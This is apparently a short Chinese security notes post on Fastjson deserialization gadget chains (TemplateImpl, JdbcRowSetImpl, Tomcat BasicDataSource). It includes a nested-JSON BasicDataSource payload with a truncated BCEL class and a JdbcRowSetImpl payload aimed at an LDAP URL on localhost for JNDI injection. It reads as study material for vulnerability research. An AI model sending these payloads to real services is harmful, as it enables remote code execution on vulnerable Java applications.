---
title: "fastjson反序列化"
modDatetime: 2025-07-25T18:47:05.000+08:00
description: "Fastjson 反序列化常见利用链与 JdbcRowSetImpl 触发方式"
tags: ["java", "fastjson"]
---

\$ref 调用 getter

通过嵌套JSON方式调用getter

```json
{
    {
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```

反序列化链：

TemplateImpl
JdbcRowSetImpl
Tomcat BasicDataSource

## JdbcRowSetImpl链

![alt text](assets/fastjson反序列化/image.png)
![alt text](assets/fastjson反序列化/image-1.png)

payload:

```txt
"{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:3890/test\", \"autoCommit\": \"true\" }";
```
